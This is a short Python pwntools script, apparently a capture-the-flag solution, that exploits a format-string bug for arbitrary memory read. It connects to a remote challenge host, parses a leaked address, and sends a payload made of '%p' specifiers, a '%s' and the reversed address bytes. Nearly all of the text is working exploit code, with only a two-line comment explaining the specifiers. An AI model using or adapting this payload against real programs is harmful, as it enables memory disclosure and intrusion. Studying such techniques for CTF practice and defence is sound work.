'''

printf exploit for arbitrary read

%p will pop up 8 bytes arguments from printf perspective
%s will scan text or addresses.

'''


def get_payload(bt):
  res = b'' 
  l = len(bt)
  i = 0
  while i < l:
    h_str = chr(bt[l-2-i]) + chr(bt[l-1-i])
    by = int(h_str, 16).to_bytes(1,'little')
    res += by 
    i += 2
  return '%p%p%p%p%p%p%p%s'.encode('utf-8') + res + b'\x00\x00'
  
from pwn import *

target = remote('rivit.dev', 10007)
addr = target.recvline()[15:].strip()
payload = get_payload(addr)
target.sendline(payload)
target.recvuntil(':')
print('addr: ', addr) 
print('payload: ', payload)

try:
  print(target.recvline())
except EOFError: 
  print("eof")
 
